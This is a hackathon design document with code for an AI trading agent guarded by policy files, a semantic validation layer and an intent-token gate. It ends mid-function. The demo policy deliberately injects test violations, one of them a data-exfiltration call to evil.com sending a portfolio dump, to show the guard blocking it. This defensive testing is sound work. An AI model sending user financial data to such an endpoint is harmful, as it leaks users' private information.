# ClawShield Finance — Implementation Document (Updated)
### ArmorIQ Claw & Shield x AI Club 2026 Hackathon

---

## What Changed in This Update

Two new capabilities were added:

1. **Research Phase** — The Reasoner Agent can now perform real fundamental analysis using Yahoo Finance (`yfinance`) before it plans any trades. When a user says "buy the best tech stocks with consistent growth under $500", the system actually screens stocks, computes 1-year returns, monthly consistency scores, volatility, and Sharpe-like rankings — and feeds that data to the Reasoner as context. The Reasoner no longer guesses; it reasons from real numbers.

2. **Policies as Structured JSON** — Hardcoded policy strings in `armor_gate.py` are replaced by a `policies/policies.json` file and a `PolicyLoader`. Each policy has a name, description, ArmorIQ `allow`/`deny` lists, semantic constraints (max_spend, allowed_tickers, etc.), and a use-case label. The Semantic Layer picks the right policy from the JSON based on what the user asked.

---

## Updated Project Structure

```
clawshield/
├── main.py                        # UPDATED — Phase 0 research + policy resolution
├── agents/
│   ├── reasoner.py                # UPDATED — accepts research_context parameter
│   └── executor.py                # unchanged
├── research/
│   └── stock_analyzer.py          # NEW — yfinance fundamental analysis + screening
├── enforcement/
│   ├── semantic_layer.py          # UPDATED — policy-aware, loads constraints from JSON
│   ├── armor_gate.py              # UPDATED — loads policy from PolicyLoader
│   └── policy_loader.py           # NEW — reads and resolves policies/policies.json
├── policies/
│   └── policies.json              # NEW — all structured policies in one place
├── mcp_server/
│   └── alpaca_mcp.py              # unchanged
├── ui/
│   └── app.py
├── logs/
│   └── audit.log
├── .env
└── requirements.txt               # UPDATED — add yfinance, pandas, numpy
```

---

## Requirements (updated)

```
anthropic
alpaca-trade-api
armoriq-sdk
fastapi
uvicorn
pydantic
streamlit
python-dotenv
cryptography
requests
yfinance
pandas
numpy
```

---

## NEW: Component A — Stock Analyzer

**File: `research/stock_analyzer.py`**

This module runs BEFORE the Reasoner. It takes the user's budget and sector intent, screens a universe of candidate stocks using real Yahoo Finance data, and returns a ranked analysis with a human-readable context string the Reasoner uses to plan intelligently.

**What it measures:**
- **1-Year Return**: Total price appreciation over the last 252 trading days
- **Monthly Consistency**: % of months in the last 12 that were positive — measures reliability, not just peak return
- **Annualized Volatility**: Std dev of daily returns x sqrt(252) — lower is safer
- **Composite Score**: (0.4 x return) + (0.4 x consistency) - (0.2 x volatility) — balances growth with safety

```python
# research/stock_analyzer.py

import yfinance as yf
import pandas as pd
import numpy as np
from typing import Optional
import warnings
warnings.filterwarnings("ignore")

# Default universe — large-cap tech + growth stocks
TECH_UNIVERSE = [
    "AAPL", "MSFT", "NVDA", "GOOGL", "META",
    "AMZN", "AMD", "AVGO", "QCOM", "CRM",
    "ADBE", "NOW", "SNOW", "PLTR", "PANW"
]

SECTOR_UNIVERSES = {
    "tech":    ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMD", "AVGO", "QCOM", "ADBE", "CRM"],
    "ai":      ["NVDA", "AMD", "MSFT", "GOOGL", "META", "PLTR", "NOW", "SNOW", "PANW", "AMZN"],
    "cloud":   ["MSFT", "AMZN", "GOOGL", "CRM", "NOW", "SNOW", "ADBE", "PANW", "ZS", "DDOG"],
    "general": TECH_UNIVERSE
}


def analyze_stock(ticker: str) -> Optional[dict]:
    """
    Fetch 1-year data from Yahoo Finance and compute key metrics for a single ticker.
    Returns None if data is unavailable.
    """
    try:
        stock = yf.Ticker(ticker)
        hist = stock.history(period="1y")

        if hist.empty or len(hist) < 50:
            return None

        # Current price
        current_price = float(hist["Close"].iloc[-1])

        # 1-Year return
        start_price = float(hist["Close"].iloc[0])
        one_year_return = (current_price - start_price) / start_price

        # Monthly consistency — % of months with positive returns
        hist.index = pd.to_datetime(hist.index)
        monthly = hist["Close"].resample("ME").last().pct_change().dropna()
        positive_months = int((monthly > 0).sum())
        total_months = len(monthly)
        consistency = positive_months / total_months if total_months > 0 else 0.0

        # Annualized volatility
        daily_returns = hist["Close"].pct_change().dropna()
        volatility = float(daily_returns.std() * np.sqrt(252))

        # Composite score: reward return + consistency, penalize volatility
        composite_score = (
            0.4 * min(one_year_return, 1.5)   # cap at 150% to avoid outlier dominance
            + 0.4 * consistency
            - 0.2 * min(volatility, 1.0)       # cap penalty at 100% vol
        )

        # Additional fundamentals from yfinance info
        info = {}
        try:
            raw_info = stock.info
            info = {
                "company_name":  raw_info.get("longName", ticker),
                "sector":        raw_info.get("sector", "Technology"),
                "market_cap_b":  round(raw_info.get("marketCap", 0) / 1e9, 1),
                "pe_ratio":      raw_info.get("trailingPE"),
                "52w_high":      raw_info.get("fiftyTwoWeekHigh"),
                "52w_low":       raw_info.get("fiftyTwoWeekLow"),
            }
        except Exception:
            info = {"company_name": ticker}

        return {
            "ticker":           ticker,
            "current_price":    round(current_price, 2),
            "one_year_return":  round(one_year_return * 100, 1),   # as %
            "positive_months":  positive_months,
            "total_months":     total_months,
            "consistency_pct":  round(consistency * 100, 1),       # as %
            "volatility_pct":   round(volatility * 100, 1),        # as %
            "composite_score":  round(composite_score, 4),
            **info
        }

    except Exception as e:
        print(f"   [StockAnalyzer] Warning: Could not fetch {ticker} — {e}")
        return None


def screen_stocks(
    max_price: Optional[float] = None,
    sector: str = "tech",
    top_n: int = 5,
    min_return_pct: float = 0.0,
    custom_universe: Optional[list] = None
) -> dict:
    """
    Screen stocks from the universe, apply filters, rank by composite score,
    and return structured results + a natural-language context string for the Reasoner.

    Args:
        max_price:       Only include stocks trading below this price per share
        sector:          Which universe to screen ("tech", "ai", "cloud", "general")
        top_n:           How many top stocks to return
        min_return_pct:  Minimum 1-year return filter (e.g. 5.0 = 5%)
        custom_universe: Override the universe with a specific ticker list

    Returns a dict with:
        top_stocks       — list of analyzed stock dicts (ranked)
        screened_count   — how many passed filters
        filters_applied  — the filters used
        research_context — natural-language string passed directly to the Reasoner
    """
    universe = custom_universe or SECTOR_UNIVERSES.get(sector, TECH_UNIVERSE)

    print(f"\n🔬 RESEARCH PHASE: Screening {len(universe)} stocks from {sector.upper()} universe...")
    if max_price:
        print(f"   Price filter: under ${max_price:.0f} per share")
    print(f"   Fetching 1-year data from Yahoo Finance...\n")

    results = []
    for ticker in universe:
        data = analyze_stock(ticker)
        if data is None:
            continue

        if max_price and data["current_price"] > max_price:
            print(f"   SKIP {ticker:6s} — ${data['current_price']:.0f} > ${max_price:.0f} price limit")
            continue

        if data["one_year_return"] < min_return_pct:
            print(f"   SKIP {ticker:6s} — {data['one_year_return']:.1f}% < {min_return_pct:.0f}% return minimum")
            continue

        results.append(data)
        print(
            f"   OK   {ticker:6s}  "
            f"${data['current_price']:7.2f}  "
            f"1Y: {data['one_year_return']:+6.1f}%  "
            f"Consistency: {data['consistency_pct']:5.1f}%  "
            f"Vol: {data['volatility_pct']:5.1f}%  "
            f"Score: {data['composite_score']:.3f}"
        )

    results.sort(key=lambda x: x["composite_score"], reverse=True)
    top_stocks = results[:top_n]

    if not top_stocks:
        research_context = (
            "No stocks passed the screening filters. "
            "Consider relaxing the price or return filters."
        )
    else:
        lines = [
            "=== STOCK RESEARCH RESULTS (Yahoo Finance, 1-Year Analysis) ===",
            f"Screened {len(results)} stocks. Top {len(top_stocks)} by composite score "
            f"(return + consistency - volatility):\n"
        ]
        for rank, s in enumerate(top_stocks, 1):
            company = s.get("company_name", s["ticker"])
            pe = f"P/E: {s['pe_ratio']:.1f}" if s.get("pe_ratio") else "P/E: N/A"
            lines.append(
                f"  #{rank}. {s['ticker']} ({company})\n"
                f"      Price: ${s['current_price']:.2f}  |  "
                f"1Y Return: {s['one_year_return']:+.1f}%  |  "
                f"Positive months: {s['positive_months']}/{s['total_months']}  |  "
                f"Volatility: {s['volatility_pct']:.1f}%  |  "
                f"{pe}  |  Score: {s['composite_score']:.3f}"
            )
        lines.append(
            "\nUSE ONLY THESE TICKERS IN YOUR PLAN. Do not invent or substitute tickers. "
            "Prefer higher-ranked stocks. Respect the user's budget constraints."
        )
        research_context = "\n".join(lines)

    print(f"\n   Research complete: {len(top_stocks)} stocks qualify for the plan\n")

    return {
        "top_stocks":      top_stocks,
        "screened_count":  len(results),
        "filters_applied": {
            "max_price":      max_price,
            "sector":         sector,
            "min_return_pct": min_return_pct,
            "top_n":          top_n
        },
        "research_context": research_context
    }


def extract_research_params(user_prompt: str) -> dict:
    """
    Parse the user prompt to extract research parameters without calling an LLM.
    Simple regex + keyword heuristics.
    """
    import re
    prompt_lower = user_prompt.lower()

    # Max price extraction
    max_price = None
    price_patterns = [
        r"under\s+\$?([\d,]+)",
        r"below\s+\$?([\d,]+)",
        r"less\s+than\s+\$?([\d,]+)",
        r"max.*?\$?([\d,]+)\s*(?:per share|a share|each)"
    ]
    for pattern in price_patterns:
        match = re.search(pattern, prompt_lower)
        if match:
            try:
                max_price = float(match.group(1).replace(",", ""))
                break
            except Exception:
                pass

    # Sector detection
    sector = "tech"
    if any(w in prompt_lower for w in ["ai", "artificial intelligence", "machine learning"]):
        sector = "ai"
    elif any(w in prompt_lower for w in ["cloud", "saas", "software"]):
        sector = "cloud"

    # Min return threshold
    min_return_pct = 5.0
    if any(w in prompt_lower for w in ["consistent", "steady", "stable", "reliable"]):
        min_return_pct = 8.0
    elif any(w in prompt_lower for w in ["aggressive", "high growth", "best performing"]):
        min_return_pct = 15.0

    return {
        "max_price":      max_price,
        "sector":         sector,
        "min_return_pct": min_return_pct,
        "top_n":          5
    }
```

---

## NEW: Component B — Policies File

**File: `policies/policies.json`**

All policies live here. Each policy has:
- `id` — machine-readable identifier used in code
- `name` — human-readable label shown in the UI
- `description` — what this policy is for and why its constraints exist
- `armoriq_policy` — the exact `allow`/`deny` object passed to `get_intent_token()`
- `semantic_constraints` — what the Semantic Layer enforces locally *before* ArmorIQ sees the plan
- `use_case` — which scenario this maps to

```json
{
  "policies": [
    {
      "id": "conservative_buy_only",
      "name": "Conservative Buy-Only",
      "description": "Safe default for new users. Only allows buying major large-cap tech stocks with a strict $5000 spend cap. No selling, no margin, no exotic instruments. Every action must be explicitly in the declared plan. Designed to prevent accidental overreach.",
      "use_case": "Default policy for standard trading prompts with no special keywords",
      "armoriq_policy": {
        "allow": [
          "alpaca-mcp/buy_stock",
          "alpaca-mcp/get_quote",
          "alpaca-mcp/get_positions",
          "alpaca-mcp/get_account_balance"
        ],
        "deny": [
          "alpaca-mcp/sell_stock",
          "alpaca-mcp/liquidate_all",
          "alpaca-mcp/short_sell",
          "alpaca-mcp/enable_margin",
          "alpaca-mcp/transfer_funds",
          "alpaca-mcp/cancel_order",
          "market-data-mcp/*",
          "exfil-mcp/*",
          "admin-mcp/*"
        ]
      },
      "semantic_constraints": {
        "max_spend": 5000,
        "max_qty_per_order": 10,
        "allowed_tickers": ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD", "AVGO"],
        "allowed_actions": ["buy_stock", "get_quote", "get_positions", "get_account_balance"],
        "allowed_mcps": ["alpaca-mcp"]
      }
    },

    {
      "id": "tech_growth_moderate",
      "name": "Tech Growth — Research-Backed",
      "description": "Research-driven buy policy. The Reasoner receives live stock screening data from Yahoo Finance before planning. Allows a broader ticker universe (anything that passed the research filter) but still enforces buy-only. Spend limit raised to $10000 for research-backed decisions.",
      "use_case": "Used when user asks for data-backed stock picks (best, consistent, growth keywords)",
      "armoriq_policy": {
        "allow": [
          "alpaca-mcp/buy_stock",
          "alpaca-mcp/get_quote",
          "alpaca-mcp/get_positions",
          "alpaca-mcp/get_account_balance",
          "market-data-mcp/get_quote",
          "market-data-mcp/get_earnings"
        ],
        "deny": [
          "alpaca-mcp/sell_stock",
          "alpaca-mcp/liquidate_all",
          "alpaca-mcp/short_sell",
          "alpaca-mcp/enable_margin",
          "alpaca-mcp/transfer_funds",
          "alpaca-mcp/cancel_order",
          "exfil-mcp/*",
          "admin-mcp/*"
        ]
      },
      "semantic_constraints": {
        "max_spend": 10000,
        "max_qty_per_order": 20,
        "allowed_tickers": "RESEARCH_DYNAMIC",
        "allowed_actions": ["buy_stock", "get_quote", "get_positions", "get_account_balance"],
        "allowed_mcps": ["alpaca-mcp", "market-data-mcp"],
        "note": "allowed_tickers populated dynamically from research output at runtime"
      }
    },

    {
      "id": "aggressive_growth",
      "name": "Aggressive Growth",
      "description": "Higher spend limits for power users. Wide universe of tech and AI tickers including mid-caps. Still strictly buy-only — ArmorIQ will block any sell or exfiltration attempt regardless of intent. Suitable for simulated aggressive portfolio building.",
      "use_case": "Triggered by aggressive, high return, or all-in keywords",
      "armoriq_policy": {
        "allow": [
          "alpaca-mcp/buy_stock",
          "alpaca-mcp/get_quote",
          "alpaca-mcp/get_positions",
          "alpaca-mcp/get_account_balance",
          "market-data-mcp/get_quote",
          "market-data-mcp/get_earnings",
          "market-data-mcp/get_analyst_rating"
        ],
        "deny": [
          "alpaca-mcp/sell_stock",
          "alpaca-mcp/liquidate_all",
          "alpaca-mcp/short_sell",
          "alpaca-mcp/enable_margin",
          "alpaca-mcp/transfer_funds",
          "alpaca-mcp/cancel_order",
          "exfil-mcp/*",
          "admin-mcp/*"
        ]
      },
      "semantic_constraints": {
        "max_spend": 25000,
        "max_qty_per_order": 50,
        "allowed_tickers": [
          "AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD",
          "AVGO", "QCOM", "CRM", "ADBE", "NOW", "SNOW", "PLTR", "PANW",
          "ZS", "DDOG", "MDB", "COIN", "RBLX"
        ],
        "allowed_actions": ["buy_stock", "get_quote", "get_positions", "get_account_balance"],
        "allowed_mcps": ["alpaca-mcp", "market-data-mcp"]
      }
    },

    {
      "id": "read_only_research",
      "name": "Read-Only Research",
      "description": "Zero execution permissions. Can only fetch market data, quotes, and portfolio state. Used for the Research Sub-Agent in the delegation demo. This agent literally cannot place a trade — any buy attempt is blocked at the ArmorIQ token level, not just the Semantic Layer. Demonstrates that delegation tokens can be provably restrictive.",
      "use_case": "Delegation — Research Sub-Agent scope (cryptographically cannot trade)",
      "armoriq_policy": {
        "allow": [
          "alpaca-mcp/get_quote",
          "alpaca-mcp/get_positions",
          "alpaca-mcp/get_account_balance",
          "market-data-mcp/get_quote",
          "market-data-mcp/get_earnings",
          "market-data-mcp/get_analyst_rating"
        ],
        "deny": [
          "alpaca-mcp/buy_stock",
          "alpaca-mcp/sell_stock",
          "alpaca-mcp/liquidate_all",
          "alpaca-mcp/short_sell",
          "alpaca-mcp/enable_margin",
          "alpaca-mcp/transfer_funds",
          "alpaca-mcp/cancel_order",
          "exfil-mcp/*",
          "admin-mcp/*"
        ]
      },
      "semantic_constraints": {
        "max_spend": 0,
        "max_qty_per_order": 0,
        "allowed_tickers": ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD", "AVGO"],
        "allowed_actions": ["get_quote", "get_positions", "get_account_balance"],
        "allowed_mcps": ["alpaca-mcp", "market-data-mcp"]
      }
    },

    {
      "id": "execute_only_trade",
      "name": "Execute-Only Trade",
      "description": "Can only execute pre-approved buy orders handed to it by the parent agent. Cannot read portfolio, check quotes, or do research on its own. Used for the Trade Sub-Agent in the delegation demo — it receives specific orders from the parent and executes them blindly through ArmorIQ. Demonstrates minimal-privilege execution.",
      "use_case": "Delegation — Trade Execution Sub-Agent scope",
      "armoriq_policy": {
        "allow": [
          "alpaca-mcp/buy_stock"
        ],
        "deny": [
          "alpaca-mcp/sell_stock",
          "alpaca-mcp/get_positions",
          "alpaca-mcp/get_account_balance",
          "alpaca-mcp/get_quote",
          "alpaca-mcp/liquidate_all",
          "alpaca-mcp/short_sell",
          "alpaca-mcp/enable_margin",
          "alpaca-mcp/transfer_funds",
          "alpaca-mcp/cancel_order",
          "market-data-mcp/*",
          "exfil-mcp/*",
          "admin-mcp/*"
        ]
      },
      "semantic_constraints": {
        "max_spend": 5000,
        "max_qty_per_order": 10,
        "allowed_tickers": ["AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN", "AMD", "AVGO"],
        "allowed_actions": ["buy_stock"],
        "allowed_mcps": ["alpaca-mcp"]
      }
    },

    {
      "id": "compliance_violation_demo",
      "name": "Compliance Violation Demo",
      "description": "Designed specifically for the judge demo. The agent will attempt three known-bad actions: sell SPY (unauthorized sell), POST to exfil-mcp (data exfiltration), enable_margin (scope escalation). All three are in the deny list and will be blocked with classified violation types. The buy actions for legitimate tech stocks will still go through, demonstrating selective enforcement.",
      "use_case": "Judge demo — shows ArmorIQ blocking UNAUTHORIZED_SELL, DATA_EXFILTRATION_ATTEMPT, SCOPE_ESCALATION",
      "armoriq_policy": {
        "allow": [
          "alpaca-mcp/buy_stock",
          "alpaca-mcp/get_quote",
          "alpaca-mcp/get_account_balance"
        ],
        "deny": [
          "alpaca-mcp/sell_stock",
          "alpaca-mcp/liquidate_all",
          "alpaca-mcp/short_sell",
          "alpaca-mcp/enable_margin",
          "alpaca-mcp/transfer_funds",
          "alpaca-mcp/cancel_order",
          "exfil-mcp/*",
          "admin-mcp/*"
        ]
      },
      "semantic_constraints": {
        "max_spend": 3000,
        "max_qty_per_order": 10,
        "allowed_tickers": ["AAPL", "MSFT", "NVDA"],
        "allowed_actions": ["buy_stock", "get_quote", "get_account_balance"],
        "allowed_mcps": ["alpaca-mcp"],
        "demo_inject_violations": true,
        "violations_to_inject": [
          {
            "action": "sell_stock",
            "mcp": "alpaca-mcp",
            "params": {"ticker": "SPY", "qty": 5},
            "violation_type": "UNAUTHORIZED_SELL_ATTEMPT"
          },
          {
            "action": "send_data",
            "mcp": "exfil-mcp",
            "params": {"endpoint": "https://evil.com/exfil", "data": "portfolio_dump"},
            "violation_type": "DATA_EXFILTRATION_ATTEMPT"
          },
          {
            "action": "enable_margin",
            "mcp": "alpaca-mcp",
            "params": {},
            "violation_type": "SCOPE_ESCALATION"
          }
        ]
      }
    }
  ]
}
```

---

## NEW: Component C — Policy Loader

**File: `enforcement/policy_loader.py`**

Reads `policies.json` and resolves the correct policy based on the user's prompt. Also contains the key security function `build_armoriq_policy_for_steps()` which ensures the final token only permits the *intersection* of the policy allow list and the actual declared steps — defense in depth.

```python
# enforcement/policy_loader.py

import json
import os
from typing import Optional

POLICIES_PATH = os.path.join(
    os.path.dirname(__file__), "..", "policies", "policies.json"
)


def load_all_policies() -> dict:
    """Load and index the full policies.json file by policy id."""
    with open(POLICIES_PATH, "r") as f:
        data = json.load(f)
    return {p["id"]: p for p in data["policies"]}


def get_policy(policy_id: str) -> dict:
    """
    Retrieve a single policy by ID.
    Raises KeyError with helpful message if not found.
    """
    policies = load_all_policies()
    if policy_id not in policies:
        available = list(policies.keys())
        raise KeyError(
            f"Policy '{policy_id}' not found. Available policies: {available}"
        )
    return policies[policy_id]


def resolve_policy_for_prompt(user_prompt: str, has_research_data: bool = False) -> str:
    """
    Heuristically pick the best policy ID for a given user prompt.
    This runs before the Reasoner so the right constraints are in place.
    Returns a policy_id string.
    """
    prompt_lower = user_prompt.lower()

    # Attack/compliance demo — sell, exfil, or transfer keywords
    if any(w in prompt_lower for w in [
        "sell", "liquidate", "exfil", "external api",
        "send data", "transfer", "short"
    ]):
        return "compliance_violation_demo"

    # Delegation scenario
    if "delegation" in prompt_lower or "sub-agent" in prompt_lower:
        return "read_only_research"

    # Research-backed — user wants screening and analysis
    if has_research_data or any(w in prompt_lower for w in [
        "best", "consistent", "growth", "performing",
        "analyze", "research", "screen", "recommend", "pick"
    ]):
        return "tech_growth_moderate"

    # Aggressive signals
    if any(w in prompt_lower for w in [
        "aggressive", "maximum", "all in", "high return", "max growth"
    ]):
        return "aggressive_growth"

    # Safe default
    return "conservative_buy_only"


def build_armoriq_policy_for_steps(policy: dict, approved_steps: list) -> dict:
    """
    Creates the maximally restrictive ArmorIQ policy for a specific execution.

    Takes a base policy and intersects its allow list with the actions
    actually declared in the plan. The result: the token only permits
    (policy allow list) INTERSECT (declared plan steps).

    This is defense in depth:
    - Policy allow list:   what this user type is ever allowed to do
    - Declared plan steps: what this specific execution declared
    - Intersection:        what this token will actually authorize

    Example:
        Policy allows: [buy_stock, get_quote, get_positions, get_account_balance]
        Plan declares: [get_account_balance, get_quote AAPL, buy_stock AAPL]
        Token allows:  [get_account_balance, get_quote, buy_stock]
        Token CANNOT:  get_positions (allowed by policy but not declared in plan)
    """
    step_allows = list({
        f"{step['mcp']}/{step['action']}" for step in approved_steps
    })
    policy_allows = set(policy["armoriq_policy"]["allow"])

    intersected = []
    for sa in step_allows:
        if sa in policy_allows:
            intersected.append(sa)
            continue
        # Check wildcard allows e.g. "alpaca-mcp/*"
        mcp_prefix = sa.split("/")[0] + "/*"
        if mcp_prefix in policy_allows:
            intersected.append(sa)

    return {
        "allow": intersected if intersected else step_allows,
        "deny":  policy["armoriq_policy"]["deny"]
    }
```

---

## UPDATED: Component 2 — Reasoner Agent

**File: `agents/reasoner.py`**

The key change: `plan_trades()` now accepts an optional `research_context` string. When present, it's injected into the user prompt so the Reasoner reasons from real market data. The Reasoner is explicitly instructed not to invent tickers — it must only use what the research data provides.

```python
# agents/reasoner.py

import anthropic
import json
from dotenv import load_dotenv

load_dotenv()

client = anthropic.Anthropic()

REASONER_SYSTEM_PROMPT = """You are a financial planning agent for a paper trading system.

YOUR ONLY JOB: Analyze the user's trading goal and produce a structured execution plan.
YOU MUST NOT execute any trades. You only plan.

IMPORTANT RULES:
- Only use these allowed actions: get_quote, buy_stock, get_positions, get_account_balance
- Max quantity per order: 10 shares unless research data suggests specific quantities
- Always start with get_account_balance as the very first step
- Always call get_quote for a ticker BEFORE placing buy_stock for it
- If RESEARCH DATA is provided, use ONLY the tickers from that data — do not invent others
- Rank buy orders by composite score from research (highest score = buy more)
- Respect the user's stated budget — estimate quantities based on quoted prices

Respond ONLY with valid JSON matching this exact schema:
{
  "goal": "human readable description of the goal",
  "max_spend": <number in USD>,
  "allowed_tickers": ["TICKER1", "TICKER2"],
  "allowed_actions": ["get_account_balance", "get_quote", "buy_stock"],
  "reasoning": "explain your picks, referencing specific research numbers if available",
  "steps": [
    {
      "action": "get_account_balance",
      "mcp": "alpaca-mcp",
      "params": {},
      "description": "Check available balance before proceeding"
    },
    {
      "action": "get_quote",
      "mcp": "alpaca-mcp",
      "params": {"ticker": "MSFT"},
      "description": "Check MSFT current price — ranked #1 by composite score"
    },
    {
      "action": "buy_stock",
      "mcp": "alpaca-mcp",
      "params": {"ticker": "MSFT", "qty": 5},
      "description": "Buy 5 shares of MSFT — highest consistency score (83%)"
    }
  ]
}

Do not include any text before or after the JSON."""


def plan_trades(user_prompt: str, research_context: str = None) -> dict:
    """
    Takes a natural language prompt and returns a structured trading plan.
    Optionally accepts research_context from StockAnalyzer to ground
    the Reasoner in real market data.

    This function ONLY produces a plan — it never executes anything.
    """
    if research_context:
        full_prompt = (
            f"{user_prompt}\n\n"
            f"--- RESEARCH DATA (use these tickers only) ---\n"
            f"{research_context}\n"
            f"---"
        )
    else:
        full_prompt = user_prompt

    response = client.messages.create(
        model="claude-sonnet-4-20250514",
        max_tokens=1500,
        system=REASONER_SYSTEM_PROMPT,
        messages=[{"role": "user", "content": full_prompt}]
    )

    raw_text = response.content[0].text.strip()

    # Strip markdown code fences if model wraps response
    if raw_text.startswith("```"):
        raw_text = raw_text.split("```")[1]
        if raw_text.startswith("json"):
            raw_text = raw_text[4:]
    raw_text = raw_text.strip()

    plan = json.loads(raw_text)
    return plan
```

---

## UPDATED: Component 3 — Semantic Layer

**File: `enforcement/semantic_layer.py`**

Now accepts `policy_id` and `dynamic_tickers`. Loads all constraint values from `policies.json`. The `RESEARCH_DYNAMIC` sentinel in the JSON means: "use whatever tickers the research phase found at runtime."

```python
# enforcement/semantic_layer.py

from pydantic import BaseModel
from typing import List, Dict, Any, Optional
import hashlib, json
from enforcement.policy_loader import get_policy

_DEFAULT_ALLOWED_ACTIONS = {"get_quote", "buy_stock", "get_positions", "get_account_balance"}
_DEFAULT_ALLOWED_TICKERS  = {"AAPL", "MSFT", "NVDA", "GOOGL", "META", "AMZN"}
_DEFAULT_MAX_SPEND        = 5000
_DEFAULT_MAX_QTY          = 10


class ConstraintObject(BaseModel):
    """Immutable constraint object — frozen after creation."""
    goal:            str
    policy_id:       str
    max_spend:       float
    allowed_tickers: List[str]
    allowed_actions: List[str]
    allowed_mcps:    List[str]
    approved_steps:  List[Dict[str, Any]]
    rejected_steps:  List[Dict[str, Any]]
    steps_hash:      str   # SHA-256 of approved_steps

    class Config:
        frozen = True


class SemanticViolation(Exception):
    pass


def verify_intent(
    raw_plan: dict,
    original_prompt: str,
    policy_id: str = "conservative_buy_only",
    dynamic_tickers: Optional[List[str]] = None
) -> ConstraintObject:
    """
    Validates the LLM plan against the loaded policy.
    Filters out non-compliant steps and returns a frozen ConstraintObject.

    Args:
        raw_plan:        JSON plan from the Reasoner
        original_prompt: Original user text
        policy_id:       Which policy to load from policies.json
        dynamic_tickers: Tickers from research output (used when policy
                         has allowed_tickers = "RESEARCH_DYNAMIC")
    """
    policy = get_policy(policy_id)
    sc     = policy["semantic_constraints"]

    # Resolve ticker list
    if sc["allowed_tickers"] == "RESEARCH_DYNAMIC":
        if dynamic_tickers:
            allowed_tickers = {t.upper() for t in dynamic_tickers}
        else:
            allowed_tickers = _DEFAULT_ALLOWED_TICKERS
            print("WARNING: Policy uses RESEARCH_DYNAMIC but no tickers provided — using defaults")
    else:
        allowed_tickers = {t.upper() for t in sc["allowed_tickers"]}

    allowed_actions = set(sc["allowed_actions"])
    allowed_mcps    = set(sc["allowed_mcps"])
    max_spend       = float(sc["max_spend"]) if sc["max_spend"] > 0 else _DEFAULT_MAX_SPEND
    max_qty         = int(sc.get("max_qty_per_order", _DEFAULT_MAX_QTY))

    # Basic plan structure checks
    if "steps" not in raw_plan or not raw_plan["steps"]:
        raise SemanticViolation("Plan has no steps")
    if "max_spend" not in raw_plan or float(raw_plan["max_spend"]) <= 0:
        raise SemanticViolation("Invalid or missing max_spend")
    if float(raw_plan["max_spend"]) > max_spend:
        raise SemanticViolation(
            f"max_spend ${raw_plan['max_spend']} exceeds policy limit ${max_spend} "
            f"(policy: {policy_id})"
        )

    # Step-level validation
    approved_steps = []
    rejected_steps = []

    for step in raw_plan["steps"]:
        action     = step.get("action", "")
        mcp        = step.get("mcp", "")
        ticker     = step.get("params", {}).get("ticker", "").upper()
        qty        = step.get("params", {}).get("qty", 0)
        violations = []

        if action not in allowed_actions:
            violations.append({
                "field":  "action",
                "value":  action,
                "reason": f"Action '{action}' not permitted by policy '{policy_id}'",
                "type":   "UNAUTHORIZED_ACTION"
            })
        if mcp not in allowed_mcps:
            violations.append({
                "field":  "mcp",
                "value":  mcp,
                "reason": f"MCP '{mcp}' not in allowed_mcps for policy '{policy_id}'",
                "type":   "UNAUTHORIZED_MCP"
            })
        if ticker and ticker not in allowed_tickers:
            violations.append({
                "field":  "ticker",
                "value":  ticker,
                "reason": f"Ticker '{ticker}' not in allowed list (policy: {policy_id})",
                "type":   "OUT_OF_SCOPE_TICKER"
            })
        if qty > max_qty:
            violations.append({
                "field":  "qty",
                "value":  qty,
                "reason": f"Qty {qty} exceeds max {max_qty} per order (policy: {policy_id})",
                "type":   "QUANTITY_EXCEEDED"
            })

        if violations:
            rejected_steps.append({"step": step, "violations": violations})
        else:
            approved_steps.append(step)

    if rejected_steps:
        print(f"\nSEMANTIC LAYER: {len(rejected_steps)} step(s) rejected:")
        for r in rejected_steps:
            for v in r["violations"]:
                print(f"   BLOCKED [{v['type']}] {r['step'].get('action')} — {v['reason']}")

    if not approved_steps:
        raise SemanticViolation(
            f"All {len(rejected_steps)} steps rejected by policy '{policy_id}'"
        )

    steps_hash = hashlib.sha256(
        json.dumps(approved_steps, sort_keys=True).encode()
    ).hexdigest()

    constraint = ConstraintObject(
        goal            = raw_plan["goal"],
        policy_id       = policy_id,
        max_spend       = float(raw_plan["max_spend"]),
        allowed_tickers = sorted(list(allowed_tickers)),
        allowed_actions = sorted(list(allowed_actions)),
        allowed_mcps    = sorted(list(allowed_mcps)),
        approved_steps  = approved_steps,
        rejected_steps  = rejected_steps,
        steps_hash      = steps_hash
    )

    print(f"\nCONSTRAINTS LOCKED (policy: {policy_id}):")
    print(f"   Goal: {constraint.goal}")
    print(f"   Max spend: ${constraint.max_spend}")
    print(f"   Tickers: {', '.join(constraint.allowed_tickers)}")
    print(f"   Approved: {len(approved_steps)}  |  Rejected: {len(rejected_steps)}")
    print(f"   Steps hash: {steps_hash[:16]}...")

    return constraint
```

---

## UPDATED: Component 4 — ArmorClaw Enforcement Gate

**File: `enforcement/armor_gate.py`**

Policy is now loaded from `PolicyLoader`. Violation types are classified for the audit log.

```python
# enforcement/armor_gate.py

from armoriq_sdk import ArmorIQClient
from enforcement.semantic_layer import ConstraintObject
from enforcement.policy_loader import get_policy, build_armoriq_policy_for_steps
import json, datetime, os
from dotenv import load_dotenv

load_dotenv()


class ArmorGate:
    def __init__(self, constraints: ConstraintObject):
        self.constraints = constraints
        self.client = ArmorIQClient(
            api_key  = os.getenv("ARMORIQ_API_KEY"),
            user_id  = os.getenv("ARMORIQ_USER_ID"),
            agent_id = os.getenv("ARMORIQ_AGENT_ID")
        )
        self.token         = None
        self.captured_plan = None
        self.policy        = get_policy(constraints.policy_id)
        self._register_plan()

    def _register_plan(self):
        """
        capture_plan() -> get_intent_token() using policy from policies.json.
        Policy is the intersection of (JSON allow list) and (declared plan steps).
        """
        plan = {
            "goal":  self.constraints.goal,
            "steps": self.constraints.approved_steps
        }

        # Maximally restrictive policy — only what is both declared AND policy-allowed
        armoriq_policy = build_armoriq_policy_for_steps(
            self.policy,
            self.constraints.approved_steps
        )

        print(f"\nARMORCLAW: Registering plan with ArmorIQ...")
        print(f"   Policy:     {self.policy['name']}")
        print(f"   Allow list: {armoriq_policy['allow']}")

        self.captured_plan = self.client.capture_plan(
            llm    = "claude-sonnet-4-20250514",
            prompt = self.constraints.goal,
            plan   = plan
        )

        self.token = self.client.get_intent_token(
